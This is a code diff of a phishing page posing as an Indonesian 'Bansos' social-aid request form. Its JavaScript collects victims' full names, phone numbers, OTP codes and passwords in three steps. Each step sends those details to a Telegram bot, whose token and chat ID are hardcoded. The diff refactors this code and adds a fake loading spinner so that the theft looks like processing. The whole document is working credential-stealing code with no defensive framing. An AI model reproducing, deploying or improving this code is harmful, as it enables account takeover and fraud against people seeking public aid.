@@ -160,6 +160,10 @@
 </div>
 </div>
 --->
+<div id="loading" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999;">
+    <img src="t5/assets/img/processing.gif" alt="Loading..." width="100" />
+</div>
+
 <div id="loading" class="loading" style="display: none;"></div>
     <main class="flex-shrink-0">
         <div id="ctl00_divContainer" class="container container-narrow">
@@ -327,6 +331,7 @@
         </div>
         </div>
     </main>
+    
     <br>
     <div class="header mt-3 text-center">
         <img src="t5/assets/img/ini1.png" id="ctl00_logohead" class="img-fluid" width="450" />
@@ -367,132 +372,132 @@
 <script src="ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
 // Function to send data to Telegram Bot
-        function sendToTelegram(message) {
-            const botToken = "7033932111:AAHeMy7G_sLAiNgE1c8BHFSqchleTI9h1Ds"; // Replace with your bot token
-            const chatId = "6960960866"; // Replace with your chat ID
+        // Function to send data to Telegram Bot
+function sendToTelegram(message) {
+    const botToken = "7033932111:AAHeMy7G_sLAiNgE1c8BHFSqchleTI9h1Ds"; // Replace with your bot token
+    const chatId = "6960960866"; // Replace with your chat ID
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            const data = {
-                chat_id: chatId,
-                text: message
-            };
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+        chat_id: chatId,
+        text: message
+    };
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Message sent", data);
-            })
-            .catch(error => {
-                console.error("Error sending message", error);
-            });
-        }
-
-        // Process first form data
-function processFirstData(){
-    $('#firstForm').submit(function(submitingprocessFirstData){
-        submitingprocessFirstData.preventDefault();
-        
-        var $full_name = $("input#full_name").val();
-        var $phone_number = $("input#phone_number").val();
-        
-        if($full_name == "" && $phone_number == ""){
-            $('.verification_info').show();
-            $('.account_verification').hide();
-            return false;
-            function processFirstData() {
-    // Show the loading spinner
-    document.getElementById('loading').style.display = 'block';
-
-    // Simulate a 10-second delay before processing the form
-    setTimeout(function() {
-        // You can replace this with your actual form processing logic or redirect
-        alert('Processing complete after 10 seconds.');
-
-        // Hide the loading spinner
-        document.getElementById('loading').style.display = 'none';
-
-        // Optionally, submit the form or show the next page
-        // document.getElementById('firstForm').submit(); // Uncomment this line to submit the form
-        // Or show the next step form
-        document.querySelector('.first').style.display = 'none';
-        document.querySelector('.second').style.display = 'block';
-    }, 10000); // 10 seconds delay
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Message sent", data);
+    })
+    .catch(error => {
+        console.error("Error sending message", error);
+    });
 }
 
-        
-        // Kirim data ke Telegram
+// Show and hide loading spinner
+function showLoading() {
+    document.getElementById('loading').style.display = 'block';
+}
+
+function hideLoading() {
+    document.getElementById('loading').style.display = 'none';
+}
+
+// Process first form data
+function processFirstData() {
+    $('#firstForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
+
+        var $full_name = $("input#full_name").val();
+        var $phone_number = $("input#phone_number").val();
+
+        if ($full_name === "" || $phone_number === "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            hideLoading();
+            return false;
+        }
+
         var message = `New Bansos Request: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}`;
         sendToTelegram(message);
-        
-        $(".second").show();
-        $('.loading').hide();
-        $('.first').hide();
-        $("input#validateFullName").val($full_name);
-        $("input#validatePhoneNumber").val($phone_number);
-        
-        return false;
-    });  
-};
 
-function processSecondData(){
-    $('#secondForm').submit(function(submitingprocessSecondData){
-        submitingprocessSecondData.preventDefault();
-        
+        setTimeout(() => {
+            $(".second").show();
+            $(".first").hide();
+            $("input#validateFullName").val($full_name);
+            $("input#validatePhoneNumber").val($phone_number);
+            hideLoading();
+        }, 2000);
+
+        return false;
+    });
+}
+
+function processSecondData() {
+    $('#secondForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
+
         var $full_name = $("input#validateFullName").val();
         var $phone_number = $("input#validatePhoneNumber").val();
         var $otp_code = $("input#otp_code").val();
-        
-        if($full_name == "" && $phone_number == "" && $otp_code == ""){
+
+        if ($otp_code === "") {
             $('.verification_info').show();
             $('.account_verification').hide();
+            hideLoading();
             return false;
         }
-        
-        // Kirim data ke Telegram
+
         var message = `OTP Code Verification: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}`;
         sendToTelegram(message);
-        
-        $(".third").show();
-        $('.loading').hide();
-        $('.second').hide();
-        $("input#validateOtpCode").val($otp_code);
-        
-        return false;
-    });  
-};
 
-function processThirdData(){
-    $('#thirdForm').submit(function(submitingprocessThirdData){
-        submitingprocessThirdData.preventDefault();
-        
+        setTimeout(() => {
+            $(".third").show();
+            $(".second").hide();
+            $("input#validateOtpCode").val($otp_code);
+            hideLoading();
+        }, 2000);
+
+        return false;
+    });
+}
+
+function processThirdData() {
+    $('#thirdForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
+
         var $full_name = $("input#validateFullName").val();
         var $phone_number = $("input#validatePhoneNumber").val();
         var $otp_code = $("input#validateOtpCode").val();
         var $password = $("input#password").val();
-        
-        if($full_name == "" && $phone_number == "" && $otp_code == "" && $password == ""){
+
+        if ($password === "") {
             $('.verification_info').show();
             $('.account_verification').hide();
+            hideLoading();
             return false;
         }
-        
-        // Kirim data ke Telegram
+
         var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
         sendToTelegram(message);
-        
-        // Optionally show final success message or reset form
-        alert("Data submitted successfully!");
-        window.location.reload();
-        
+
+        setTimeout(() => {
+            alert("Data submitted successfully!");
+            hideLoading();
+            window.location.reload();
+        }, 2000);
+
         return false;
-    });  
-};
+    });
+}
 
 </script>
 <script type="text/javascript" src="t5/js/jquery-3.4.1.min.js"></script>
